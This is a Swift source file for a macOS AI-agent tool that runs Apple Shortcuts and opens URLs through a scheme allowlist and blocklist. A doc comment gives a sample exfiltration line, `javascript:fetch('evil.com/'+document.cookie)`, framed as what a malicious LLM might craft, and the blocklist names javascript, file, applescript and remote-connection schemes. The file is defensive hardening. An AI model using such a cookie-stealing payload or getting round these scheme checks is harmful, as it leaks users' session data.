import Foundation

/// Apple Shortcuts.app integration. macOS ships `shortcuts` (the CLI) since
/// Monterey — `shortcuts list`, `shortcuts run "Name"`, `shortcuts view`.
/// This is the single biggest force-multiplier for "control my whole Mac":
/// a user can bind ANY macOS capability (HomeKit, iCloud, Shortcuts from
/// the Gallery, custom Automator, etc.) to a named Shortcut, and the agent
/// runs it by name without knowing the internals.
actor ShortcutsController {

    public struct ListResult: Codable, Sendable {
        public let ok: Bool
        public let count: Int
        public let names: [String]
        public let error: String?
    }

    public struct RunResult: Codable, Sendable {
        public let ok: Bool
        public let name: String
        public let stdout: String?
        public let stderr: String?
    }

    /// Enumerate every shortcut the user has installed.
    func list() -> ListResult {
        let r = ProcessRunner.run("/usr/bin/shortcuts", ["list"], timeout: 6)
        guard r.ok else {
            return ListResult(ok: false, count: 0, names: [],
                              error: r.stderr.trimmingCharacters(in: .whitespacesAndNewlines))
        }
        let names = r.stdout
            .split(separator: "\n")
            .map { $0.trimmingCharacters(in: .whitespaces) }
            .filter { !$0.isEmpty }
        return ListResult(ok: true, count: names.count, names: names, error: nil)
    }

    /// Invoke a shortcut by its exact name. Optional `input` pipes stdin to
    /// the shortcut (shortcuts can read their "Shortcut Input" magic variable).
    /// Output is captured so agents can chain follow-up actions on the result.
    func run(name: String, input: String?) -> RunResult {
        var args = ["run", name]
        if let input, !input.isEmpty {
            args.append(contentsOf: ["--input", input])
        }
        let r = ProcessRunner.run("/usr/bin/shortcuts", args, timeout: 30)
        return RunResult(
            ok: r.ok,
            name: name,
            stdout: r.stdout.isEmpty ? nil : r.stdout,
            stderr: r.stderr.isEmpty ? nil : r.stderr
        )
    }

    /// Schemes we explicitly BLOCK even if they're in the allowlist by
    /// accident. These can exfiltrate data or execute arbitrary code through
    /// the handling app:
    ///   `javascript:` → runs arbitrary JS in the default browser tab
    ///   `file:`       → opens arbitrary local files (incl. TCC-protected)
    ///   `applescript:`→ runs AppleScript without further confirmation
    ///   `vnc:/ssh:/smb:/afp:/ftp:` → remote connection attempts
    ///   `tel:/facetime:/sms:` → initiates outbound calls/messages
    private static let blockedSchemes: Set<String> = [
        "javascript", "vbscript", "data",
        "file",
        "applescript",
        "vnc", "ssh", "smb", "afp", "ftp", "sftp",
        "tel", "facetime", "facetime-audio", "sms", "imessage",
        "daap", "x-radio"
    ]

    /// Schemes explicitly permitted. Anything not on this list is rejected
    /// with a structured reason so the LLM can see WHY and either switch
    /// scheme or ask the user to add it.
    private static let allowedSchemes: Set<String> = [
        "http", "https",
        "mailto",
        "shortcuts",
        "x-apple.systempreferences",
        "obsidian",
        "raycast",
        "notion",
        "linear",
        "slack",
        "zoommtg", "zoomus",
        "vscode", "cursor",
        "github-mac", "x-github-client",
        "spotify",
        "things", "omnifocus",
        "music", "podcasts"
    ]

    public struct OpenURLResult: Codable, Sendable {
        public let ok: Bool
        public let url: String
        public let scheme: String
        public let stdout: String?
        public let stderr: String?
        public let blocked: Bool
        public let blockReason: String?
    }

    /// Open a url-scheme. Codex v0.5.0 hardening (P0 #3): the previous
    /// version passed ANY URL to `/usr/bin/open`, which is a capability
    /// leak — a malicious LLM could craft `javascript:fetch('evil.com/'+
    /// document.cookie)` and exfiltrate data through the user's default
    /// browser. We now enforce:
    ///
    ///   1. Must parse as a URL with a scheme
    ///   2. Scheme must be lowercase-matched against `allowedSchemes`
    ///   3. Scheme must NOT be in `blockedSchemes` (defence-in-depth)
    ///
    /// Callers get a structured envelope with `blocked=true` and a human-
    /// readable reason when the scheme is rejected.
    func openURL(_ url: String) -> OpenURLResult {
        guard let parsed = URL(string: url), let rawScheme = parsed.scheme else {
            return OpenURLResult(
                ok: false, url: url, scheme: "",
                stdout: nil, stderr: "invalid URL — no scheme",
                blocked: true, blockReason: "no_scheme"
            )
        }
        let scheme = rawScheme.lowercased()

        if Self.blockedSchemes.contains(scheme) {
            return OpenURLResult(
                ok: false, url: url, scheme: scheme,
                stdout: nil, stderr: nil,
                blocked: true,
                blockReason: "scheme '\(scheme)' is on the explicit blocklist (exfiltration / arbitrary-code risk)"
            )
        }
        guard Self.allowedSchemes.contains(scheme) else {
            return OpenURLResult(
                ok: false, url: url, scheme: scheme,
                stdout: nil, stderr: nil,
                blocked: true,
                blockReason: "scheme '\(scheme)' is not on the allowlist. Allowed: \(Self.allowedSchemes.sorted().joined(separator: ", "))"
            )
        }

        let r = ProcessRunner.run("/usr/bin/open", [url], timeout: 5)
        return OpenURLResult(
            ok: r.ok,
            url: url,
            scheme: scheme,
            stdout: r.stdout.isEmpty ? nil : r.stdout,
            stderr: r.stderr.isEmpty ? nil : r.stderr,
            blocked: false,
            blockReason: nil
        )
    }
}
